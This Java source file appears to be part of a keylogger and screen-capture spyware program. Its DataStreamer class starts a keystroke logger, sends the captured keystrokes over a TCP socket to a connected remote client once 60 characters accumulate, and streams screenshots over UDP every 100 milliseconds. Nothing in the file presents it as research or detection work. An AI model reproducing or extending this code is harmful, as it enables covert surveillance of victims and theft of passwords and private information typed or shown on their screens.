package model.program;

import model.connection.UDPServer;
import model.connection.TCPServer;

import java.awt.*;
import java.io.IOException;
import java.io.OutputStream;
import java.net.SocketException;
import java.net.UnknownHostException;

public class DataStreamer {

    private KeyLogger Logger;
    private ScreenShooter Shooter;
    private TCPServer TCPServer;
    private model.connection.UDPServer UDPServer;

    public DataStreamer() throws AWTException, SocketException, UnknownHostException {
        Logger = new KeyLogger();
        Shooter = new ScreenShooter();
        TCPServer = new TCPServer();
        UDPServer = new UDPServer();
    }

    public void run(){
        Logger.startKeyLogger();


        Thread runLogSender = new Thread(() -> {
            while (true) {
                try {
                    if(validLog()) {
                        sendLog();
                        Logger.resetLog();
                    }
                    Thread.sleep(1000);
                } catch (IOException | InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        });

        Thread runScreenSender = new Thread(()-> {
            while(true) {
                try {
                    byte[] screenshotBytes = Shooter.getframeBytes();
                    if (screenshotBytes.length < 65535) {
                        UDPServer.sendBytes(screenshotBytes);
                    }
                    Thread.sleep(100);
                } catch (IOException | InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        });

        this.TCPServer.startConnection();
        runLogSender.start();
        runScreenSender.start();
    }

    private boolean validLog() {
        return this.Logger.getLog().length() >= 60;
    }

    public void sendLog() throws IOException {
        OutputStream outputStream = this.TCPServer.getClientSocket().getOutputStream();
        outputStream.write(this.Logger.getLog().getBytes());
    }




}
